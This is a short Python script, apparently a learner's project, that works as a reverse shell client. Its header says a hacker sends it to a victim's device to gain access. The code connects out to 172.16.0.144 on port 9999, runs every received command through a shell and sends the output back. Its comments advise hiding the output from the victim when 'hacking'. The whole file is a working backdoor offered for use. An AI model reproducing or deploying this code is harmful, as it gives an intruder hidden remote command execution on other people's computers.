
# TODO: Hacker sends this file over the client's device to get its access

from base64 import decode
import socket
import os
import subprocess


s = socket.socket() 
host = "172.16.0.144"
port = 9999

# for client we bind the host and port with different keyword
s.connect((host,port))

# for getting processing multiple command using infinite loop
while True:

    command_recv = s.recv(1024)   # receiving the data/commands/results 

    # if the command is related to cd then have to perform change directory.
    # also to check cd command first two letters should be cd.
    if command_recv[:2].decode("utf-8") == 'cd':
        # now to what change dir depends on further from 3rd place commands
        os.chdir(command_recv[3:].decode("utf-8"))
    
    # if there is a normal command
    if len(command_recv) > 0:
        
        # now want to get access of client's computer with commands, that means want to
        # access client's OS so for that python has subprocess library, it will just 
        # help you to perform command from python terminal or from systems teminal.

    #! also check with shell false 
        my_cmd = subprocess.Popen(command_recv[:].decode("utf-8"), shell= True,
        stdout= subprocess.PIPE, stdin= subprocess.PIPE, stderr=subprocess.PIPE)


        output_byte = my_cmd.stdout.read() + my_cmd.stderr.read()   # in bytes
        output_string = output_byte.decode("utf-8")                 # in string

        # also we want to know the current working directory also add > symbol
        # > symbol is genrally there in every terminal path at the end. 
        current_wd = os.getcwd() + ">"
        # current_wd = os.curdir() + ">"
    
    #! try sending output_byte it is also in bytes why to encode
        # now send the output of the command back to the server make sure send encoded 
        s.send(str.encode(output_string, "utf8")) 

        # now if you are hacking then you don't have to display the output in clients
        # screen but if its your friend then u can display the output for transperancy
        print(output_string)



